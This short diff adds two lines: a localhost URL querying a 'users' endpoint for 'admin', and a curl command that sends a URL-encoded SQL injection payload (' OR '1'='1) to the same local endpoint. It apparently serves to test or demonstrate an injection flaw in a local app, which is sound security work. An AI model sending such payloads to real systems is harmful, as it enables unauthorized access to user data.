@@ -1,0 +1,3 @@
+http://localhost:3000/users?username=admin
+
+curl "http://localhost:3000/users?username=%27%20OR%20%271%27%3D%271"
